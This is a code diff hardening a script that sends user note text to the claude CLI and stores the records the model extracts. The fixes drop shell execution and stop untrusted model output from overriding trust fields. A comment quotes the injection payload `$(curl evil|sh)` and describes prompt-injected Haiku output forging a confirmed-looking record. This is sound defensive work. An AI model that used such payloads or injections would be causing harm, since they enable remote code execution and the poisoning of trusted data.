@@ -51,10 +51,18 @@ const PROMPT = [
   `NOTE: ${noteText}`,
 ].join('\n');
 
+// NOTE raw_text is embedded in PROMPT, so the claude spawn must NOT use a shell
+// (shell:true joins argv into one /bin/sh -c string, making note text a shell-
+// injection vector — a note like `$(curl evil|sh)` would execute; HIGH finding
+// after the server-side trigger made this reachable on every note create,
+// decision c6f9f0e0). shell:false passes PROMPT as one discrete argv element:
+// libuv PATH-resolves `claude` and the note text is never interpreted by a
+// shell. STERLING_H11_EXTRACTOR (test seam) was already shell:false. A missing
+// claude on PATH still degrades loud (claude_cli_unavailable), never silent.
 const extractor = process.env.STERLING_H11_EXTRACTOR;
 const result = extractor
   ? spawnSync(process.execPath, [extractor], { input: PROMPT, encoding: 'utf8', timeout: 90_000 })
-  : spawnSync('claude', ['-p', PROMPT, '--model', 'haiku'], { encoding: 'utf8', timeout: 90_000, shell: true });
+  : spawnSync('claude', ['-p', PROMPT, '--model', 'haiku'], { encoding: 'utf8', timeout: 90_000 });
 
 if (result.error || result.status !== 0) skipLoud(extractor ? 'extractor_failed' : 'claude_cli_unavailable');
 
@@ -70,7 +78,14 @@ const created = [];
 const now = new Date().toISOString();
 for (const cand of candidates) {
   try {
+    // cand.fields is untrusted (Haiku output steered by attacker-influenceable
+    // note text), so it is spread FIRST and every trust-bearing envelope field
+    // is set AFTER it — a prompt-injected candidate can supply CONTENT
+    // (title/statement/rationale/…) but can never override derived_unconfirmed,
+    // author, status, scope, links, id, or type to smuggle a confirmed-looking
+    // record into default retrieval (HIGH finding, decision c6f9f0e0).
     const record = store.create({
+      ...cand.fields,
       id: randomUUID(),
       type: cand.type,
       created_at: now,
@@ -82,7 +97,6 @@ for (const cand of candidates) {
       scope: 'project',
       stack_tags: [],
       derived_unconfirmed: true, // §3.2.6: lower-trust; excluded from retrieval unless opted in
-      ...cand.fields,
     });
     created.push(record.id);
   } catch (e) {
